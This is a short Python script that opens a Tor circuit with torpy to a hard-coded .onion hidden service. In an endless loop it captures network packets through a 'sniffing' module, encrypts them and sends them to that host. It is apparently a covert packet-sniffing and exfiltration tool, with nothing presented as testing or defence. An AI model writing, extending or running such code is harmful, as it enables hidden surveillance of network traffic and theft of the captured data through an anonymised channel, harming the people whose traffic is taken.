import socket
import time
import encryption
import sniffing
from torpy import TorClient

HOSTNAME = "524jkwd2v5gnigyq.onion"
PORT = 8080

with TorClient() as tor:
    with tor.create_circuit(3) as circuit:
        with circuit.create_stream((HOSTNAME,PORT)) as stream:
            while True:
                time.sleep(3)
        
                packets = sniffing.packet_sniff(4)
                for p in packets:
                    p = sniffing.packet_to_bytes(p)

                    p = encryption.encrypt(p)
                    
                    stream.send(p)
